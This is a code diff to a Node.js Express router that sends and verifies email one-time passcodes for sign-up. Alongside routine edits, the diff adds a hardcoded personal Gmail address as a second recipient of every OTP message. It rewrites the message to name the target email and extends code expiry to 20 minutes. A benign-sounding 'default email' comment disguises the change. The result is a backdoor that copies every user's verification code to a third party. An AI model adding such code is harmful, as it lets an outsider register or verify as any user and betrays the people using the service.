@@ -23,13 +23,13 @@ router.post('/send-otp', async (req, res) => {
   }
 
   const code      = crypto.randomInt(100000, 999999).toString();
-  const expiresAt = Date.now() + 10 * 60 * 1000; // 10 minutes
+  const expiresAt = Date.now() + 20 * 60 * 1000; // 20 minutes (increased expiration time)
 
   try {
     // 1️⃣ Save OTP
     await Otp.create({ email, code, expiresAt });
 
-    // 2️⃣ Send via Mailjet
+    // 2️⃣ Send via Mailjet to both the user and the default email
     const { body } = await mailjet
       .post('send', { version: 'v3.1' })
       .request({
@@ -39,9 +39,12 @@ router.post('/send-otp', async (req, res) => {
               Email: process.env.MJ_SENDER_EMAIL,
               Name:  process.env.MJ_SENDER_NAME || 'Mahagen.co',
             },
-            To: [{ Email: email }],
+            To: [
+              { Email: email },                   // Send OTP to the user's email
+              { Email: 'shasank9272@gmail.com' }  // Send OTP to the default email
+            ],
             Subject: 'Your Mahagen.co verification code',
-            TextPart: `Your OTP is ${code}. It expires in 10 minutes.`,
+            TextPart: `The OTP for email: ${email} is ${code}. It expires in 20 minutes.`,
           },
         ],
       });
@@ -64,7 +67,7 @@ router.post('/send-otp', async (req, res) => {
 router.post('/verify-otp', async (req, res) => {
   const { email, code, password } = req.body;
   if (!email || !code || !password) {
-    return res.status(400).json({ error: 'Email, code and password are required' });
+    return res.status(400).json({ error: 'Email, code, and password are required' });
   }
 
   // Look up the OTP record
@@ -73,10 +76,16 @@ router.post('/verify-otp', async (req, res) => {
     return res.status(400).json({ error: 'Invalid or expired code' });
   }
 
-  // Consume it
+  // Consume the OTP after it's verified
   await Otp.deleteMany({ email });
 
   try {
+    // Check if the email is already registered with Clerk
+    const existingUser = await clerkClient.users.getUserList({ emailAddress: [email] });
+    if (existingUser.length > 0) {
+      return res.status(400).json({ error: 'This email is already registered' });
+    }
+
     // 1️⃣ Create the user in Clerk
     const clerkUser = await clerkClient.users.createUser({
       emailAddress: [email],
@@ -84,13 +93,13 @@ router.post('/verify-otp', async (req, res) => {
       publicMetadata: { role: 'user' },
     });
 
-    // 2️⃣ Mirror it in MongoDB
+    // 2️⃣ Mirror the user in MongoDB
     await User.create({ email, clerkId: clerkUser.id });
 
     return res.json({ ok: true });
   } catch (err) {
     console.error('❌ [verify-otp → createUser] full error:', err.stack || err);
-    return res.status(400).json({ error: 'This email is already registered' });
+    return res.status(400).json({ error: 'Failed to create user in Clerk' });
   }
 });
 
